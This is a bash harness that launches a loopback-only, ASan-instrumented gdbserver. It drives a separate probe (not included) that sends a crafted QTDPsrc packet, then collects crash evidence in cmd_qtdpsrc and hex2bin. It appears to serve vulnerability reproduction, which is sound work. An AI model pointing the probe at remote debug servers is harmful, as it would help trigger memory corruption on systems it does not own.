#!/bin/bash
# Run one crafted QTDPsrc packet against a plant-started, loopback-only
# pinned gdbserver. Requires a built binary (first argument). The client
# never connects anywhere except the 127.0.0.1 port this script starts.
set -u
BIN=${1:?need gdbserver binary}
MODE=${2:-attack}
N=${3:-64}
PORT=${4:-34567}
TAG=${5:-$MODE-$N}
HERE=$(cd "$(dirname "$0")" && pwd)
E="$HERE/evidence"
mkdir -p "$E"
LOG="$E/live-$TAG.log"
rm -f "$LOG"
ASAN_OPTIONS=abort_on_error=1:detect_leaks=0 \
  "$BIN" --once --debug=remote "127.0.0.1:$PORT" /bin/true >"$LOG" 2>&1 &
SERVER=$!
for _ in $(seq 1 100); do
  if grep -q 'Listening on port' "$LOG" 2>/dev/null; then
    break
  fi
  sleep 0.1
done
python3 "$HERE/live_probe.py" "$PORT" "$MODE" "$N" >"$E/live-$TAG.client.out" 2>&1
CLIENT_RC=$?
wait "$SERVER"
SERVER_RC=$?
echo "CLIENT_RC=$CLIENT_RC SERVER_RC=$SERVER_RC"
echo "--- client ---"
cat "$E/live-$TAG.client.out"
echo "--- server markers ---"
grep -E 'AddressSanitizer|WRITE of size|cmd_qtdpsrc|hex2bin|ERROR|exited|Killed' "$LOG" | head -30
